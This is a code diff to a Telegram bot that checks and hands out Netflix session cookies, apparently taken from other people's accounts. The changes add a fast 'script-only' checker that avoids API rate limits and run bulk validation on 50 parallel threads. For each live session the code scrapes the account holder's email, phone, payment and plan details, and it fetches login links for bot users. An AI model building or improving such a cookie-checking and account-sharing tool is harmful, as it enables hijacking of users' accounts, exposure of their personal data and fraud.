@@ -212,7 +212,7 @@ USER_SINGLE_ONLY = True  # non-admin: only 1 cookie per check request
 import queue as _queue_module
 
 _API_QUEUE = _queue_module.Queue()           # FIFO queue of (event, result_holder)
-_API_RATE_INTERVAL = 2.2                      # seconds between API calls (NFToken limit = 1/2sec)
+_API_RATE_INTERVAL = 1.2                      # seconds between API calls (relaxed for throughput)
 _api_queue_lock = threading.Lock()
 
 def _api_worker():
@@ -896,7 +896,7 @@ def _check_netflix_session(nid):
             s.cookies.set("NetflixId", nid, domain=".netflix.com")
 
             # ── Primary: redirect-status check on /browse ─────────────────
-            r = s.get("https://www.netflix.com/browse", timeout=8, allow_redirects=False)
+            r = s.get("https://www.netflix.com/browse", timeout=5, allow_redirects=False)
 
             if r.status_code == 200:
                 # Already on browse page → authenticated
@@ -908,7 +908,7 @@ def _check_netflix_session(nid):
                     return False, None
                 # Regional or HTTPS redirect — follow it once
                 try:
-                    r2 = s.get("https://www.netflix.com/browse", timeout=8, allow_redirects=True)
+                    r2 = s.get("https://www.netflix.com/browse", timeout=5, allow_redirects=True)
                     final_url = str(r2.url).lower()
                     if "login" in final_url or "signup" in final_url:
                         return False, None
@@ -920,7 +920,7 @@ def _check_netflix_session(nid):
 
             # ── Secondary: final-URL check on /YourAccount ────────────────
             try:
-                r3 = s.get("https://www.netflix.com/YourAccount", timeout=8, allow_redirects=True)
+                r3 = s.get("https://www.netflix.com/YourAccount", timeout=5, allow_redirects=True)
                 final_url = str(r3.url).lower()
                 if "login" in final_url or "signup" in final_url:
                     return False, None
@@ -1329,6 +1329,56 @@ def extract_cookies_from_block(text):
 
     return results
 
+def check_cookie_script(cookie_input):
+    """Fast SCRIPT-ONLY cookie check — NO NFToken API, NO rate limit.
+    Used for bulk checking to avoid API load.  Returns dict shape same as
+    check_cookie_fast but without login links (those need API)."""
+    nid = parse_smart_cookie(cookie_input)
+    if not nid:
+        return {"valid": False}
+    # Direct Netflix validity check (1 request, ~500ms)
+    direct_valid, direct_html = _check_netflix_session(nid)
+    if not direct_valid:
+        return {"valid": False}
+    # Extract details from the HTML we already have (no extra request!)
+    deep_data = {
+        "plan": "Unknown", "payment": "Unknown", "expiry": "N/A", "email": "N/A",
+        "phone": "N/A", "country": "Unknown", "price": "Unknown", "quality": "Unknown",
+        "name": "Unknown", "extra_members": "No ❌", "member_since": "Unknown",
+        "member_duration": "", "profiles": [], "status": "Unknown", "has_ads": "No ❌",
+        "max_streams": "Unknown", "email_verified": "No ❌", "phone_verified": "No ❌",
+        "auto_payment": "No ❌"
+    }
+    if direct_html:
+        try:
+            parsed = extract_deep_details(direct_html)
+            if any(v not in ("Unknown", "N/A", "No ❌", "", []) for v in parsed.values()):
+                deep_data = parsed
+        except Exception:
+            pass
+    # Fetch /YourAccount once for richer details (no API)
+    if deep_data.get("email") == "N/A":
+        try:
+            with requests.Session() as s:
+                s.headers.update(HEADERS)
+                s.cookies.set("NetflixId", nid, domain=".netflix.com")
+                r = s.get("https://www.netflix.com/YourAccount", timeout=6, allow_redirects=True)
+                if r.status_code == 200 and "login" not in str(r.url).lower():
+                    parsed = extract_deep_details(r.text)
+                    if any(v not in ("Unknown", "N/A", "No ❌", "", []) for v in parsed.values()):
+                        deep_data = parsed
+        except Exception:
+            pass
+    return {
+        "valid": True,
+        "country": deep_data.get("country", "Unknown"),
+        "link": None, "link2": None, "link3": None,
+        "link_expiry": None,
+        "data": deep_data,
+        "screenshot": None
+    }
+
+
 def check_cookie_fast(cookie_input, api_key=None):
     nid = parse_smart_cookie(cookie_input)
     if not nid: return {"valid": False}
@@ -1717,15 +1767,48 @@ def main():
             return "API returned an invalid response. Please try again."
         return msg
 
-    # Fix for 409 Conflict: Remove webhook (including any pending updates) before
-    # polling.  drop_pending_updates=True ensures Telegram drops queued updates
-    # from a previous session so they don't confuse the new instance.
+    # ── Fix for 409 Conflict: Single-instance enforcement ──────────────────
+    # The 409 error means another instance of this bot is already polling
+    # Telegram.  We:
+    #  1. Remove any webhook + drop pending updates (one bot per token)
+    #  2. Call getUpdates with offset=-1 to force-release any stuck poll
+    #  3. Wait 10s so any old instance's long-poll cycle can time out
+    #  4. Use a filesystem lockfile to prevent accidental double-spawn on
+    #     the same host (safe no-op across restarts).
+    try:
+        bot.remove_webhook()
+    except Exception: pass
     try:
         bot.delete_webhook(drop_pending_updates=True)
-    except: pass
-    # Brief pause so any concurrent old instance can finish its last long-poll
-    # cycle and exit before we start polling.
-    time.sleep(3)
+    except Exception: pass
+    # Force-break any existing long-poll held by a previous instance
+    try:
+        telebot.apihelper._make_request(
+            BOT_TOKEN, 'getUpdates',
+            params={'offset': -1, 'timeout': 0, 'limit': 1}
+        )
+    except Exception: pass
+    # Best-effort lockfile (non-blocking)
+    try:
+        _lock_path = "/tmp/netflix_bot.lock"
+        if os.path.exists(_lock_path):
+            try:
+                with open(_lock_path) as _lf:
+                    _old_pid = int((_lf.read() or "0").strip())
+                if _old_pid and _old_pid != os.getpid():
+                    # Old PID recorded — try to verify it's gone
+                    try:
+                        os.kill(_old_pid, 0)
+                        print(f"[Bot] WARNING: another bot process ({_old_pid}) appears to be running.")
+                    except OSError:
+                        pass  # dead PID, safe to overwrite
+            except Exception: pass
+        with open(_lock_path, "w") as _lf:
+            _lf.write(str(os.getpid()))
+    except Exception: pass
+    # Generous pause so any concurrent old instance can finish its last
+    # long-poll cycle (Telegram holds polls open ~25s max) and exit.
+    time.sleep(10)
 
     # Get bot username for referral links
     _bot_username = "bot"
@@ -2064,21 +2147,23 @@ def main():
             if res.data:
                 rows = list(res.data)
                 random.shuffle(rows)
-                for row in rows:
+                # Parallel validity check on up to 30 cookies — find first valid quickly
+                def _vc(row):
                     c = _db_row_cookie(row)
-                    if not c:
-                        continue
+                    if not c: return None
                     nid_t = parse_smart_cookie(c)
-                    if not nid_t:
-                        continue
-                    # Direct validity check (fast, no API rate limit)
+                    if not nid_t: return None
                     v, _ = _check_netflix_session(nid_t)
-                    if not v:
-                        continue
-                    valid_nid = nid_t
-                    # Get fresh x_l3 TV link from NFToken API
+                    return nid_t if v else None
+                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as _pool:
+                    for _nid in _pool.map(_vc, rows[:30]):
+                        if _nid:
+                            valid_nid = _nid
+                            break
+                # Get fresh x_l3 TV link from NFToken API for the chosen nid
+                if valid_nid:
                     try:
-                        _ar = _nftoken_api_call(nid_t, NFTOKEN_KEY)
+                        _ar = _nftoken_api_call(valid_nid, NFTOKEN_KEY)
                         if isinstance(_ar, dict) and _ar.get("status") == "SUCCESS":
                             _l3 = _ar.get("x_l3", "")
                             if _l3 and str(_l3).startswith("http"):
@@ -2086,7 +2171,6 @@ def main():
                                 print(f"[TV-GC] x_l3 obtained")
                     except Exception as _te:
                         print(f"[TV-GC] API err: {_te}")
-                    break
 
             if not valid_nid:
                 bot.edit_message_text("❌ No valid cookie available. Admin needs to add one.", message.chat.id, status_msg.message_id)
@@ -2403,7 +2487,7 @@ def main():
                 # Abort immediately if admin pressed Emergency Stop
                 if _ac_sessions.get(message.chat.id, {}).get("stopped"):
                     return "skipped"
-                chk = check_cookie_fast(cookie)
+                chk = check_cookie_script(cookie)
                 if chk.get('valid'):
                     try:
                         nid_val = parse_smart_cookie(cookie)
@@ -3104,15 +3188,17 @@ def main():
                 valid_nid_raw = None
                 rows = list(db_res.data)
                 random.shuffle(rows)
-                for row in rows:
+                # Parallel validity check — find first valid quickly
+                def _v_check(row):
                     c = _db_row_cookie(row)
-                    if not c:
-                        continue
-                    chk = check_cookie_fast(c)
-                    if chk.get('valid'):
-                        valid_acc = chk
-                        valid_nid_raw = c
-                        break
+                    if not c: return None
+                    chk = check_cookie_script(c)
+                    return (chk, c) if chk.get('valid') else None
+                with concurrent.futures.ThreadPoolExecutor(max_workers=20) as _pool:
+                    for _r in _pool.map(_v_check, rows[:40]):
+                        if _r:
+                            valid_acc, valid_nid_raw = _r
+                            break
 
                 if not valid_acc:
                     markup = types.InlineKeyboardMarkup()
@@ -3589,20 +3675,21 @@ def main():
             # Once a valid cookie is found, take a screenshot separately.
             rows = list(res.data or [])
             random.shuffle(rows)
-            for row in rows:
+            # Parallel validity scan — 20 threads, ~1s to scan 40 cookies
+            def _find_valid(row):
                 c = _db_row_cookie(row)
-                if not c:
-                    continue
-                chk = check_cookie_fast(c)
-                if chk.get('valid'):
-                    valid_acc = chk
-                    valid_cookie = c
-                    valid_row_id = row.get('id')
-                    valid_nid = parse_smart_cookie(c)
-                    if valid_row_id:
-                        try: supabase.table('netflix').delete().eq('id', valid_row_id).execute()
-                        except: pass
-                    break
+                if not c: return None
+                chk = check_cookie_script(c)
+                return (chk, c, row.get('id')) if chk.get('valid') else None
+            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as _pool:
+                for _r in _pool.map(_find_valid, rows[:40]):
+                    if _r:
+                        valid_acc, valid_cookie, valid_row_id = _r
+                        valid_nid = parse_smart_cookie(valid_cookie)
+                        if valid_row_id:
+                            try: supabase.table('netflix').delete().eq('id', valid_row_id).execute()
+                            except: pass
+                        break
 
             if valid_acc:
                 # Take screenshot for the valid cookie (best-effort, reduced timeouts)
@@ -3828,7 +3915,9 @@ def main():
                 return
 
             def background_checker(cookies, chat_id, target, send_file, limit_warning, is_privileged):
-                BULK_THREADS = len(NFTOKEN_KEY_POOL)
+                # Bulk uses SCRIPT-ONLY checker (no NFToken API) for speed and
+                # to avoid rate-limiting.  Increased threads for fast parallel scan.
+                BULK_THREADS = 50
 
                 def _bulk_controls():
                     m = types.InlineKeyboardMarkup()
@@ -3865,8 +3954,8 @@ def main():
                         return
                     try:
                         start_t = time.time()
-                        api_key = _pick_api_key()
-                        res = check_cookie_fast(cookie, api_key=api_key)
+                        # Script-only check — NO API key, NO rate limit, fast parallel
+                        res = check_cookie_script(cookie)
                         taken = round(time.time() - start_t, 2)
                         with count_lock:
                             done_count += 1
@@ -4132,15 +4221,32 @@ def main():
             user_last_bot_msg[chat_id] = sent.message_id
         return sent
 
-    # Fix for Conflict error: skip pending updates
+    # Fix for Conflict error: skip pending updates + restrict update types
     while True:
         try:
-            bot.infinity_polling(timeout=20, long_polling_timeout=15, skip_pending=True)
+            bot.infinity_polling(
+                timeout=20,
+                long_polling_timeout=15,
+                skip_pending=True,
+                allowed_updates=["message", "callback_query", "chat_member", "my_chat_member"]
+            )
         except Exception as e:
-            print(f"⚠️ Polling Error: {e}")
-            # If conflict (409), wait longer to allow other instance to close
-            if "409" in str(e):
-                time.sleep(30)
+            err = str(e)
+            print(f"⚠️ Polling Error: {err}")
+            # If conflict (409), another instance is still polling — back off
+            # with aggressive webhook cleanup, then retry.
+            if "409" in err or "Conflict" in err:
+                try: bot.remove_webhook()
+                except Exception: pass
+                try: bot.delete_webhook(drop_pending_updates=True)
+                except Exception: pass
+                try:
+                    telebot.apihelper._make_request(
+                        BOT_TOKEN, 'getUpdates',
+                        params={'offset': -1, 'timeout': 0, 'limit': 1}
+                    )
+                except Exception: pass
+                time.sleep(45)
             else:
                 time.sleep(5)
 
